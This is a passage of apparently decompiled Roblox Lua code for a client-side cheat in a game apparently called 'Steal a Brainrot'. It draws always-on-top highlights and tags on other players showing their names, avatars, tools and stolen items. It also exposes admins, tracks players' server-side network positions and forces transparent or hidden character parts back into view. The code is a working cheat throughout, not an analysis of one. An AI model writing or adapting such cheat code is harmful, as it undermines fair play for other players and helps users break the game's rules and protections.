					return child.Name, child, v9 and v9.Text or nil, v9, fn27(child)
				end
			end

			return nil
		end

		local function clampValue()
			local currentCamera = Workspace.CurrentCamera
			return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * n10))
		end

		local function fn30(text, font3, size)
			local getTextBoundsParams = Instance.new("GetTextBoundsParams")
			getTextBoundsParams.Text = text
			getTextBoundsParams.Font = font3
			getTextBoundsParams.Size = size
			getTextBoundsParams.Width = 1000

			local ok, result = pcall(function()
				return TextService:GetTextBoundsAsync(getTextBoundsParams)
			end)

			getTextBoundsParams:Destroy()
			if ok then
				return result.X
			end
			return (utf8.len(text) or #text) * size * 0.56
		end

		local function fn31(uiStroke, color, arg, arg2)
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = color
			uiStroke.Enabled = true
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Transparency = 0

			local ok = pcall(function()
				uiStroke.BorderOffset = UDim.new(0, 0)
				uiStroke.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end)

			uiStroke.Thickness = ok and arg or arg2
			return ok
		end

		local function createTextLabel(name, parent, zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = name
			textLabel.AnchorPoint = Vector2.new(0, 0.5)
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font2
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex
			textLabel.Parent = parent
			return textLabel
		end

		fn20 = function(arg, hasTool)
			local numVal = clampValue()
			local visible = enabledFlags2.Name == true
			local text = enabledFlags2.Username == true
			local visible2 = enabledFlags2.Avatar == true
			local flag10 = enabledFlags2.Tool == true
			local visible3 = enabledFlags2.Brainrot == true
			local visible4 = enabledFlags2["Admin Panel"] == true
			local visible5 = visible2 and math.floor(numVal * 0.72) or 0
			local flag102 = flag10 and math.floor(numVal * 0.82) or 0
			local n12 = math.floor(numVal * 0.7)
			local n13 = math.max(1, math.floor(numVal * 0.04))
			local targetPlayer = arg.TargetPlayer
			text = text and targetPlayer.Name or targetPlayer.DisplayName
			arg.DisplayName.Text = text
			arg.NameShadow.Text = text
			local n14 = math.floor(math.clamp(fn30(arg.DisplayName.Text, font2, n12) + 4, n12, 230))
			local hasTool2 = flag10 and hasTool
			local n15 = 0
			local n16 = 0

			if visible2 then
				n15 = 0 + visible5
			end

			local n17 = 0

			if visible then
				if not (n15 > 0) then
					n17 = n15
				else
					n17 = n15 + n13
				end

				n15 = n17 + n14
			end

			local n18 = 0

			if hasTool2 then
				if not (n15 > 0) then
					n18 = n15
				else
					n18 = n15 + n13
				end

				n15 = n18 + flag102
			end

			local n19 = math.max(n15, 1)
			visible3 = visible3 and type(arg.BrainrotName) == "string" and arg.BrainrotName ~= ""
			local n20 = math.floor(numVal * 0.88)
			local n21 = -math.max(2, math.floor(numVal * 0.16))
			local brainrotName = visible3 and arg.BrainrotName or ""
			local visible6 = visible3 and math.floor(math.clamp(fn30(brainrotName, font2, n20) + 6, n20, 320)) or 0
			local visible7 = visible3 and type(arg.BrainrotGeneration) == "string" and arg.BrainrotGeneration ~= ""
			local brainrotGeneration = visible7 and arg.BrainrotGeneration or ""
			local n22 = math.max(2, math.floor(numVal * 0.12))
			local visible8 = visible7 and math.floor(math.clamp(fn30(brainrotGeneration, font2, n20) + 4, n20, 150)) or 0
			local n23 = visible6 + (visible7 and n22 + visible8 or 0)
			local visible9 = visible and n17 + n14 * 0.5 or n19 * 0.5
			local n24 = visible9 - n23 * 0.5
			local n25 = math.min(0, n24)
			local n26 = math.max(n19, n24 + n23)
			local n27 = math.ceil(n26 - n25)
			visible4 = visible4 and arg.IsAdmin == true
			local n28 = math.max(1, math.floor(numVal * 0.6))
			local visible10 = visible4 and math.floor(math.clamp(fn30("Admin Panel", font, n28) + 3, n28, 150)) or 0
			local n29 = n28 + -math.max(2, math.floor(numVal * 0.2))
			local brainrotMutation = visible3 and arg.BrainrotMutation or nil
			local visible11 = brainrotMutation ~= nil
			local n30 = math.floor(numVal * 0.62)
			local n31 = -math.max(1, math.floor(numVal * 0.1))
			local visible12 = visible11 and math.floor(math.clamp(fn30(brainrotMutation.Text:gsub("<[^<>]->", ""), font2, n30) + 6, n30, 260)) or 0
			local visible13 = visible11 and n30 + n31 or 0
			local n32 = visible9 - visible12 * 0.5
			local n33

			if visible11 then
				n33 = math.min(n25, n32)
				n27 = math.ceil(math.max(n26, n32 + visible12) - n33)
			else
				n33 = n25
			end

			local visible14 = visible3 and n20 + n21 or 0
			local n34 = n29 + visible13 + visible14 + numVal
			local n35 = -n33
			local n36 = n35 + n24
			local n37 = (n29 + visible13 + visible14 + numVal * 0.5) / n34
			local visible15 = visible3 and (n29 + visible13 + n20 * 0.5) / n34 or 0
			local visible16 = visible11 and (n29 + n30 * 0.5) / n34 or 0
			local visible17 = visible4 and n28 * 0.5 / n34 or 0
			local n38 = 1 / n27
			local n39 = 1 / n34
			arg.HasTool = hasTool
			arg.Billboard.Size = UDim2.fromOffset(n27, n34)
			arg.DisplayName.Visible = visible
			arg.NameShadow.Visible = visible
			arg.Avatar.Visible = visible2
			arg.ToolIcon.Visible = flag10 and arg.ToolIcon.Image ~= ""
			arg.ToolShadow.Visible = flag10 and arg.ToolShadow.Image ~= ""
			arg.Avatar.Position = UDim2.fromScale((n35 + n16) / n27, n37)
			arg.Avatar.Size = UDim2.fromScale(visible5 / n27, visible5 / n34)
			arg.DisplayName.Position = UDim2.fromScale((n35 + n17) / n27, n37)
			arg.DisplayName.Size = UDim2.fromScale(n14 / n27, n12 / n34)
			arg.NameShadow.Position = UDim2.fromScale((n35 + n17) / n27 + n38, n37 + n39)
			arg.NameShadow.Size = arg.DisplayName.Size
			arg.ToolIcon.Position = UDim2.fromScale((n35 + n18) / n27, n37)
			arg.ToolIcon.Size = UDim2.fromScale(flag102 / n27, flag102 / n34)
			arg.ToolShadow.Position = UDim2.fromScale((n35 + n18) / n27 + n38, n37 + n39)
			arg.ToolShadow.Size = arg.ToolIcon.Size
			arg.AdminLine.Visible = visible4

			if visible4 then
				arg.AdminLine.Position = UDim2.fromScale((n35 + visible9) / n27, visible17)
				arg.AdminLine.Size = UDim2.fromScale(visible10 / n27, n28 / n34)
				arg.AdminText.Position = UDim2.fromScale(0, 0.5)
				arg.AdminText.Size = UDim2.fromScale(visible10 / visible10, 1)
				arg.AdminShadow.Position = UDim2.fromScale(1 / visible10, 0.5 + 1 / n28)
				arg.AdminShadow.Size = arg.AdminText.Size
			end

			arg.MutationText.Visible = visible11
			arg.MutationShadow.Visible = visible11

			if visible11 then
				arg.MutationText.RichText = brainrotMutation.RichText
				arg.MutationText.Text = brainrotMutation.Text
				arg.MutationText.TextColor3 = brainrotMutation.Color

				if brainrotMutation.Font then
					arg.MutationText.FontFace = brainrotMutation.Font
					arg.MutationShadow.FontFace = brainrotMutation.Font
				end

				local uiStroke = arg.MutationText:FindFirstChildOfClass("UIStroke")

				if uiStroke and brainrotMutation.StrokeColor then
					uiStroke.Color = brainrotMutation.StrokeColor
				end

				arg.MutationShadow.RichText = false
				arg.MutationShadow.Text = brainrotMutation.Text:gsub("<[^<>]->", "")

				if brainrotMutation.Gradient then
					arg.MutationGradient.Color = brainrotMutation.Gradient.Color
					arg.MutationGradient.Rotation = brainrotMutation.Gradient.Rotation
					arg.MutationGradient.Enabled = true
				else
					arg.MutationGradient.Enabled = false
				end

				arg.MutationText.Position = UDim2.fromScale((n35 + n32) / n27, visible16)
				arg.MutationText.Size = UDim2.fromScale(visible12 / n27, n30 / n34)
				arg.MutationShadow.Position = UDim2.fromScale((n35 + n32) / n27 + n38, visible16 + n39)
				arg.MutationShadow.Size = arg.MutationText.Size
			end

			arg.BrainrotText.Text = brainrotName
			arg.BrainrotShadow.Text = brainrotName
			arg.BrainrotText.Visible = visible3
			arg.BrainrotShadow.Visible = visible3
			arg.GenerationText.Text = brainrotGeneration
			arg.GenerationShadow.Text = brainrotGeneration
			arg.GenerationText.Visible = visible7
			arg.GenerationShadow.Visible = visible7

			if visible3 then
				local n40 = n36 / n27
				arg.BrainrotText.Position = UDim2.fromScale(n40, visible15)
				arg.BrainrotText.Size = UDim2.fromScale(visible6 / n27, n20 / n34)
				arg.BrainrotShadow.Position = UDim2.fromScale(n40 + n38, visible15 + n39)
				arg.BrainrotShadow.Size = arg.BrainrotText.Size

				if visible7 then
					local n41 = (n36 + visible6 + n22) / n27
					arg.GenerationText.Position = UDim2.fromScale(n41, visible15)
					arg.GenerationText.Size = UDim2.fromScale(visible8 / n27, n20 / n34)
					arg.GenerationShadow.Position = UDim2.fromScale(n41 + n38, visible15 + n39)
					arg.GenerationShadow.Size = arg.GenerationText.Size
				end
			end
		end

		local function fn32(arg, arg2, arg3)
			local arg32 = arg3 or arg2
			local playerHighlight = Instance.new("Highlight")
			playerHighlight.Name = "PlayerHighlight"
			playerHighlight.Adornee = arg2.Parent
			playerHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			playerHighlight.FillColor = Color3.fromRGB(0, 67, 148)
			playerHighlight.FillTransparency = 0.76
			playerHighlight.OutlineColor = Color3.fromRGB(72, 207, 255)
			playerHighlight.OutlineTransparency = 0.02
			playerHighlight.Parent = screenGui
			local playerTag = Instance.new("BillboardGui")
			playerTag.Name = "PlayerTag"
			playerTag.Adornee = arg32
			playerTag.AlwaysOnTop = true
			playerTag.LightInfluence = 0
			playerTag.MaxDistance = 1000
			playerTag.Size = UDim2.fromOffset(1, 1)
			playerTag.StudsOffsetWorldSpace = parseVector3(arg2, arg32)
			playerTag.Parent = screenGui
			local networkPosition = Instance.new("BoxHandleAdornment")
			networkPosition.Name = "NetworkPosition"
			networkPosition.Adornee = arg32
			networkPosition.AlwaysOnTop = true
			networkPosition.CFrame = CFrame.new(0, 1.2, 0)
			networkPosition.Color3 = Color3.fromRGB(72, 207, 255)
			networkPosition.Size = Vector3.new(3.2, 5.2, 2.2)
			networkPosition.Transparency = 0.78
			networkPosition.Visible = false
			networkPosition.ZIndex = 1
			networkPosition.Parent = screenGui
			local content = Instance.new("Frame")
			content.Name = "Content"
			content.Size = UDim2.fromScale(1, 1)
			content.BackgroundTransparency = 1
			content.Parent = playerTag
			local avatar = Instance.new("ImageLabel")
			avatar.Name = "Avatar"
			avatar.AnchorPoint = Vector2.new(0, 0.5)
			avatar.BackgroundTransparency = 1
			avatar.ScaleType = Enum.ScaleType.Crop
			avatar.Parent = content
			local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint.AspectRatio = 1
			uiAspectRatioConstraint.Parent = avatar
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(1, 0)
			uiCorner.Parent = avatar
			local textLabel = createTextLabel("NameShadow", content, 1)
			textLabel.Text = arg.DisplayName
			textLabel.TextColor3 = Color3.fromRGB(7, 19, 34)
			textLabel.TextTransparency = 0.05
			local textLabel2 = createTextLabel("DisplayName", content, 2)
			textLabel2.Text = arg.DisplayName
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke = Instance.new("UIStroke")
			fn31(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
			uiStroke.Parent = textLabel2
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Color = colorSequence
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Color = v6
			uiGradient2.Rotation = 90
			uiGradient2.Parent = textLabel2
			local textLabel3 = createTextLabel("BrainrotShadow", content, 3)
			textLabel3.TextColor3 = Color3.fromRGB(25, 0, 4)
			local textLabel4 = createTextLabel("BrainrotText", content, 4)
			textLabel4.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke2 = Instance.new("UIStroke")
			fn31(uiStroke2, Color3.fromRGB(124, 0, 15), 0.052, 1.7)
			uiStroke2.Parent = textLabel4
			local uiGradient3 = Instance.new("UIGradient")
			uiGradient3.Color = v8
			uiGradient3.Rotation = 90
			uiGradient3.Parent = uiStroke2
			local uiGradient4 = Instance.new("UIGradient")
			uiGradient4.Color = v7
			uiGradient4.Rotation = 90
			uiGradient4.Parent = textLabel4
			local textLabel5 = createTextLabel("MutationShadow", content, 3)
			textLabel5.TextColor3 = Color3.fromRGB(0, 0, 0)
			textLabel5.TextTransparency = 0.15
			local textLabel6 = createTextLabel("MutationText", content, 4)
			textLabel6.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel6.RichText = true
			local uiStroke3 = Instance.new("UIStroke")
			fn31(uiStroke3, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke3.Transparency = 0.15
			uiStroke3.Parent = textLabel6
			local uiGradient5 = Instance.new("UIGradient")
			uiGradient5.Enabled = false
			uiGradient5.Rotation = 90
			uiGradient5.Parent = textLabel6
			local textLabel7 = createTextLabel("GenerationShadow", content, 3)
			textLabel7.TextColor3 = Color3.fromRGB(18, 48, 0)
			textLabel7.TextTransparency = 0.08
			local textLabel8 = createTextLabel("GenerationText", content, 4)
			textLabel8.TextColor3 = Color3.fromRGB(115, 255, 0)
			local uiStroke4 = Instance.new("UIStroke")
			fn31(uiStroke4, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke4.Transparency = 0.3
			uiStroke4.Parent = textLabel8
			local toolShadow = Instance.new("ImageLabel")
			toolShadow.Name = "ToolShadow"
			toolShadow.AnchorPoint = Vector2.new(0, 0.5)
			toolShadow.BackgroundTransparency = 1
			toolShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			toolShadow.ImageTransparency = 0.35
			toolShadow.ScaleType = Enum.ScaleType.Fit
			toolShadow.Visible = false
			toolShadow.ZIndex = 1
			toolShadow.Parent = content
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.Parent = toolShadow
			local toolIcon = Instance.new("ImageLabel")
			toolIcon.Name = "ToolIcon"
			toolIcon.AnchorPoint = Vector2.new(0, 0.5)
			toolIcon.BackgroundTransparency = 1
			toolIcon.ScaleType = Enum.ScaleType.Fit
			toolIcon.Visible = false
			toolIcon.ZIndex = 2
			toolIcon.Parent = content
			local uiAspectRatioConstraint3 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint3.AspectRatio = 1
			uiAspectRatioConstraint3.Parent = toolIcon
			local adminLine = Instance.new("Frame")
			adminLine.Name = "AdminLine"
			adminLine.AnchorPoint = Vector2.new(0.5, 0.5)
			adminLine.BackgroundTransparency = 1
			adminLine.BorderSizePixel = 0
			adminLine.Visible = false
			adminLine.ZIndex = 3
			adminLine.Parent = content
			local textLabel9 = createTextLabel("AdminShadow", adminLine, 3)
			textLabel9.AnchorPoint = Vector2.new(0, 0.5)
			textLabel9.FontFace = font
			textLabel9.Text = "Admin Panel"
			textLabel9.TextColor3 = Color3.fromRGB(10, 14, 22)
			textLabel9.TextTransparency = 0.08
			local textLabel10 = createTextLabel("AdminText", adminLine, 4)
			textLabel10.AnchorPoint = Vector2.new(0, 0.5)
			textLabel10.FontFace = font
			textLabel10.Text = "Admin Panel"
			textLabel10.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke5 = Instance.new("UIStroke")
			fn31(uiStroke5, Color3.fromRGB(10, 24, 45), 0.02, 1.45)
			uiStroke5.Transparency = 0.02
			uiStroke5.Parent = textLabel10
			local uiGradient6 = Instance.new("UIGradient")
			local colorSequenceNew = ColorSequence.new
			local tbl6 = {}
			local colorKeypoint = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
			local colorKeypoint2 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(235, 242, 255))
			tbl6[1] = colorKeypoint
			tbl6[2] = colorKeypoint2

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
				table.move(values, 1, values.n, 3, tbl6)
			end

			uiGradient6.Color = colorSequenceNew(tbl6)
			uiGradient6.Rotation = 90
			uiGradient6.Parent = textLabel10

			local tbl7 = {
				TargetPlayer = arg,
				PlayerHighlight = playerHighlight,
				NetworkTracker = networkPosition,
				NetworkAnchor = arg32,
				VisualHead = arg2,
				Billboard = playerTag,
				Avatar = avatar,
				NameShadow = textLabel,
				DisplayName = textLabel2,
				BrainrotShadow = textLabel3,
				BrainrotText = textLabel4,
				BrainrotGradient = uiGradient4,
				BrainrotStrokeGradient = uiGradient3,
				GenerationShadow = textLabel7,
				GenerationText = textLabel8,
				MutationShadow = textLabel5,
				MutationText = textLabel6,
				MutationGradient = uiGradient5,
				ToolShadow = toolShadow,
				ToolIcon = toolIcon,
				AdminLine = adminLine,
				AdminShadow = textLabel9,
				AdminText = textLabel10,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotMutation = nil,
				IsAdmin = false,
				HasTool = false,
			}

			fn20(tbl7, false)
			return tbl7
		end

		local function fn33(arg)
			local tag = arg.Tag
			local character_ = arg.Character

			if not (not tag or not character_) then
				local visualHead = tag.VisualHead
				local networkAnchor = tag.NetworkAnchor

				if not (not visualHead or not visualHead:IsDescendantOf(character_) or not networkAnchor or not networkAnchor:IsDescendantOf(character_)) then
					tag.Billboard.Adornee = networkAnchor
					local visible = networkAnchor ~= visualHead and (networkAnchor.Position - visualHead.Position).Magnitude >= n8
					tag.PlayerHighlight.Enabled = not visible
					tag.NetworkTracker.Adornee = networkAnchor
					tag.NetworkTracker.Visible = visible
					return true
				end
			end

			return false
		end

		local function fn34(arg)
			if arg:GetAttribute("AdminCommands") == true then
				return true
			end
			local attribute = arg:GetAttribute("Role")
			return type(attribute) == "string" and string.find(string.lower(attribute), "admin", 1, true) ~= nil
		end

		local function fn35(arg, arg2)
			if not arg.Tag then
				return
			end
			arg.Tag.IsAdmin = fn34(arg2)
			fn20(arg.Tag, arg.Tag.HasTool == true)
		end

		local function fn36(arg)
			if not arg.Tag or not arg.Character then
				return
			end
			local v9 = fn22(getTool(arg.Character))
			local visible = v9 ~= ""
			arg.Tag.ToolIcon.Image = v9
			arg.Tag.ToolIcon.Visible = visible
			arg.Tag.ToolShadow.Image = v9
			arg.Tag.ToolShadow.Visible = visible
			fn20(arg.Tag, visible)
		end

		local function fn37(arg)
			if arg.Tag then
				arg.Tag.BrainrotName = arg.BrainrotName
				arg.Tag.BrainrotGeneration = arg.BrainrotGeneration
				arg.Tag.BrainrotMutation = fn28(arg.BrainrotMutationLabel)
				fn20(arg.Tag, arg.Tag.HasTool == true)
				local v9 = fn15(arg.BrainrotGeneration)

				if arg.Tag.BrainrotGradient then
					arg.Tag.BrainrotGradient.Color = v9.Text
				end

				if arg.Tag.BrainrotStrokeGradient then
					arg.Tag.BrainrotStrokeGradient.Color = v9.Stroke
				end

				if arg.BrainrotHighlight and (enabledFlags2.Brainrot ~= true or arg.BrainrotHighlight.Adornee ~= arg.BrainrotModel) then
					arg.BrainrotHighlight:Destroy()
					arg.BrainrotHighlight = nil
				end

				if enabledFlags2.Brainrot == true and arg.BrainrotModel and arg.BrainrotModel.Parent and not arg.BrainrotHighlight then
					local brainrotHighlight = Instance.new("Highlight")
					brainrotHighlight.Name = "BrainrotHighlight"
					brainrotHighlight.Adornee = arg.BrainrotModel
					brainrotHighlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					brainrotHighlight.FillTransparency = 0.68
					brainrotHighlight.OutlineTransparency = 0
					brainrotHighlight.Parent = screenGui
					arg.BrainrotHighlight = brainrotHighlight
				end

				if arg.BrainrotHighlight then
					arg.BrainrotHighlight.FillColor = v9.Fill
					arg.BrainrotHighlight.OutlineColor = v9.Outline
				end
			end
		end

		local function fn38(arg)
			if arg.BrainrotGenerationConnection then
				arg.BrainrotGenerationConnection:Disconnect()
				arg.BrainrotGenerationConnection = nil
			end

			local v9 = ipairs
			local brainrotMutationConnections = arg.BrainrotMutationConnections or {}

			for _, brainrotMutationConnection in v9(brainrotMutationConnections) do
				brainrotMutationConnection:Disconnect()
			end

			arg.BrainrotMutationConnections = nil
			arg.BrainrotMutationLabel = nil
		end

		local function fn39(arg, brainrotMutationLabel, arg2)
			if not brainrotMutationLabel then
				return
			end
			arg.BrainrotMutationLabel = brainrotMutationLabel
			local connections3 = {}

			local function fn40()
				if arg.BrainrotModel == arg2 then
					fn37(arg)
				end
			end

			connections3[#connections3 + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Text"):Connect(fn40)
			connections3[#connections3 + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Visible"):Connect(fn40)
			connections3[#connections3 + 1] = brainrotMutationLabel:GetPropertyChangedSignal("TextColor3"):Connect(fn40)
			arg.BrainrotMutationConnections = connections3
		end

		local function fn40(arg, arg2)
			arg.StealingVersion = arg.StealingVersion + 1
			local stealingVersion = arg.StealingVersion

			if arg2:GetAttribute("Stealing") ~= true then
				fn38(arg)
				arg.BrainrotName = nil
				arg.BrainrotGeneration = nil
				arg.BrainrotModel = nil
				fn37(arg)
				return
			end

			task.spawn(function()
				for idx = 1, 7 do
					if not flag9 or arg.StealingVersion ~= stealingVersion or playerMap[arg2] ~= arg then
						return
					end
					local v9, v10, v11, v12, v13 = fn29(arg2)

					if v9 then
						fn38(arg)
						arg.BrainrotName = v9
						arg.BrainrotModel = v10
						arg.BrainrotGeneration = v11
						fn39(arg, v13, v10)

						if v12 then
							arg.BrainrotGenerationConnection = v12:GetPropertyChangedSignal("Text"):Connect(function()
								if arg.BrainrotModel == v10 then
									arg.BrainrotGeneration = v12.Text
									fn37(arg)
								end
							end)
						end

						fn37(arg)
						return
					end

					if idx < 7 then
						task.wait(0.12)
					end
				end

				if arg.StealingVersion == stealingVersion then
					fn38(arg)
					arg.BrainrotName = nil
					arg.BrainrotGeneration = nil
					arg.BrainrotModel = nil
					fn37(arg)
				end
			end)
		end

		local function fn41(arg, arg2, arg3)
			local userIdEntry = userIdMap[arg2.UserId]

			if userIdEntry == nil then
				local ok

				ok, userIdEntry = pcall(function()
					return Players:GetUserThumbnailAsync(arg2.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
				end)

				userIdEntry = ok and userIdEntry or ""
				userIdMap[arg2.UserId] = userIdEntry
			end

			if flag9 and arg.Version == arg3 and arg.Tag and arg.Tag.Avatar.Parent then
				arg.Tag.Avatar.Image = userIdEntry
			end
		end

		local flag10 = false

		local function fn42(arg)
			if arg:IsA("BasePart") then
				return arg.Name ~= "HumanoidRootPart"
			end
			return arg:IsA("Decal") or arg:IsA("Texture")
		end

		local function fn43(arg, arg2)
			if not (flag10 or not arg2.Parent) then
				local transparency2 = arg2.Transparency

				if transparency2 <= n9 then
					arg.RevealOriginals[arg2] = transparency2
					arg.RevealHidden[arg2] = nil
					return
				end

				if arg.RevealOriginals[arg2] ~= nil then
					arg.RevealHidden[arg2] = transparency2
					flag10 = true

					pcall(function()
						arg2.Transparency = transparency

						if arg2:IsA("BasePart") then
							arg2.LocalTransparencyModifier = 0
						end
					end)

					flag10 = false
					return
				end
			end
		end

		local function fn44(arg, arg2)
			if arg.RevealBound[arg2] then
				return
			end
			arg.RevealBound[arg2] = true
			local transparency2 = arg2.Transparency

			if transparency2 <= n9 then
				arg.RevealOriginals[arg2] = transparency2
			elseif arg2:IsA("BasePart") and enabledFlags[arg2.Name] then
				arg.RevealOriginals[arg2] = 0
			elseif arg2:IsA("Decal") and string.lower(arg2.Name) == "face" then
				arg.RevealOriginals[arg2] = 0
				local n12 = #arg.RevealConnections + 1

				arg.RevealConnections[n12] = arg2:GetPropertyChangedSignal("Transparency"):Connect(function()
					if flag9 then
						fn43(arg, arg2)
					end
				end)

				fn43(arg, arg2)
				return
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2:GetPropertyChangedSignal("Transparency"):Connect(function()
				if flag9 then
					fn43(arg, arg2)
				end
			end)

			fn43(arg, arg2)
		end

		local function fn45(arg, arg2)
			for _, descendant in ipairs(arg2:GetDescendants()) do
				if fn42(descendant) then
					fn44(arg, descendant)
				end
			end

			arg.RevealConnections[#arg.RevealConnections + 1] = arg2.DescendantAdded:Connect(function(descendant)
				if flag9 and fn42(descendant) then
					fn44(arg, descendant)
				end
			end)
		end

		local function fn46(arg)
			disconnectAll2(arg.RevealConnections)
			flag10 = true

			for k, v9 in pairs(arg.RevealHidden) do
				if k.Parent then
					pcall(function()
						k.Transparency = v9
					end)
				end
			end

			flag10 = false
			table.clear(arg.RevealHidden)
			table.clear(arg.RevealOriginals)
			table.clear(arg.RevealBound)
		end

		local function fn47(arg)
			disconnectAll2(arg.CharacterConnections)
			fn17(arg)
			fn46(arg)
			fn38(arg)

			if arg.BrainrotHighlight then
				arg.BrainrotHighlight:Destroy()
				arg.BrainrotHighlight = nil
			end

			arg.BrainrotModel = nil
			arg.BrainrotGeneration = nil

			if arg.Tag then
				if arg.Tag.PlayerHighlight then
					arg.Tag.PlayerHighlight:Destroy()
				end

				if arg.Tag.NetworkTracker then
					arg.Tag.NetworkTracker:Destroy()
				end

				arg.Tag.Billboard:Destroy()
				arg.Tag = nil
			end

			arg.Character = nil
			arg.BindingCharacter = nil
		end

		local fn48 = nil

		fn48 = function(arg, arg2, character_)
			fn47(arg)
			arg.Version = arg.Version + 1
			local version = arg.Version
			if not flag9 or not character_ then
				return
			end
			arg.Character = character_
			arg.BindingCharacter = character_
			fn18(arg, character_)
			fn45(arg, character_)

			local function fn49()
				task.defer(function()
					if flag9 and arg.Version == version then
						fn36(arg)
					end
				end)
			end

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					fn49()
				elseif child:IsA("Humanoid") then
					fn18(arg, character_)
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					fn49()
				end
			end)

			arg.CharacterConnections[#arg.CharacterConnections + 1] = character_.AncestryChanged:Connect(function()
				if not (not flag9 or arg.Version ~= version or character_ ~= arg2.Character) then
					if not character_:IsDescendantOf(Workspace) then
						arg.Version = arg.Version + 1
						fn47(arg)
						return
					end

					if not arg.Tag then
						task.defer(function()
							if flag9 and arg.Version == version then
								fn48(arg, arg2, character_)
							end
						end)
					end
				end
			end)

			task.spawn(function()
				local head = character_:FindFirstChild("Head") or character_:WaitForChild("Head", 5)

				if not flag9 or arg.Version ~= version or character_ ~= arg2.Character or not character_:IsDescendantOf(Workspace) or not head or not head:IsDescendantOf(character_) then
					if arg.Version == version then
						arg.BindingCharacter = nil
					end

					return
				end

				local v9 = fn19(character_, head)
				arg.Tag = fn32(arg2, head, v9)
				fn33(arg)
				arg.BindingCharacter = nil

				arg.CharacterConnections[#arg.CharacterConnections + 1] = head.AncestryChanged:Connect(function()
					if not (not flag9 or arg.Version ~= version or head:IsDescendantOf(character_)) then
						arg.Version = arg.Version + 1
						fn47(arg)
						local character_2 = arg2.Character

						if character_2 and character_2:IsDescendantOf(Workspace) then
							task.defer(function()
								if flag9 and playerMap[arg2] == arg then
									fn48(arg, arg2, character_2)
								end
							end)
						end
					end
				end)

				fn35(arg, arg2)
				fn36(arg)
				fn40(arg, arg2)
				fn41(arg, arg2, version)
			end)
		end

		local function fn49(player)
			local playerEntry = playerMap[player]
			if not playerEntry then
				return
			end
			playerEntry.Version = playerEntry.Version + 1
			playerEntry.StealingVersion = playerEntry.StealingVersion + 1
			fn47(playerEntry)
			disconnectAll2(playerEntry.PlayerConnections)
			playerMap[player] = nil
		end

		local function fn50(player)
			if player == localPlayer or playerMap[player] then
				return
			end

			local tbl6 = {
				Version = 0,
				StealingVersion = 0,
				Character = nil,
				BindingCharacter = nil,
				Tag = nil,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotGenerationConnection = nil,
				BrainrotModel = nil,
				BrainrotHighlight = nil,
				NameDisplayHumanoid = nil,
				NameDisplayDistance = nil,
				RevealOriginals = {},
				RevealHidden = {},
				RevealBound = {},
				RevealConnections = {},
				CharacterConnections = {},
				PlayerConnections = {},
			}

			playerMap[player] = tbl6

			for _, v9 in ipairs({ "AdminCommands", "Role" }) do
				tbl6.PlayerConnections[#tbl6.PlayerConnections + 1] = player:GetAttributeChangedSignal(v9):Connect(function()
					if flag9 and playerMap[player] == tbl6 then
						fn35(tbl6, player)
					end
				end)
			end

			tbl6.PlayerConnections[#tbl6.PlayerConnections + 1] = player.CharacterAdded:Connect(function(character_)
				fn48(tbl6, player, character_)
			end)

			tbl6.PlayerConnections[#tbl6.PlayerConnections + 1] = player.CharacterRemoving:Connect(function(character_)
				if tbl6.Character == character_ then
					tbl6.Version = tbl6.Version + 1
					fn47(tbl6)
				end
			end)

			tbl6.PlayerConnections[#tbl6.PlayerConnections + 1] = player:GetPropertyChangedSignal("Character"):Connect(function()
				task.defer(function()
					if not (not flag9 or playerMap[player] ~= tbl6) then
						local character_ = player.Character

						if character_ ~= tbl6.Character then
							fn48(tbl6, player, character_)
						elseif tbl6.Tag then
							local adornee = tbl6.Tag.Billboard.Adornee

							if not adornee or not adornee:IsDescendantOf(Workspace) then
								fn48(tbl6, player, character_)
							end
						end
					end
				end)
			end)

			tbl6.PlayerConnections[#tbl6.PlayerConnections + 1] = player:GetAttributeChangedSignal("Stealing"):Connect(function()
				fn40(tbl6, player)
			end)

			fn48(tbl6, player, player.Character)
		end

		local function fn51()
			for k, v9 in pairs(playerMap) do
